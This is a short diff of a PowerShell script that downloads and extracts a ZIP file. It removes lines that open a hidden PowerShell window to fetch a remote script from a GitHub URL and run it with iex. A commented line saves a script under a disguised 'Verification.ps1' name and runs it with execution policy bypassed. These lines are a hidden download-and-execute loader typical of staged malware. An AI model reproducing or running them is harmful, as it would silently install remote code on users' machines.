@@ -10,8 +10,3 @@ Start-Sleep -Seconds 2
 # --- Extract the ZIP file ---
 Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
 Start-Sleep -Seconds 2
-
-
-#run the next script
-Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/sleep.ps1 | iex`""
-#cmd /c curl.exe -k -Ss "https://raw.githubusercontent.com/waed69/Brabus/main/downlaod.ps1" -o "%APPDATA%\Verification.ps1" && start "" powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\Verification.ps1"
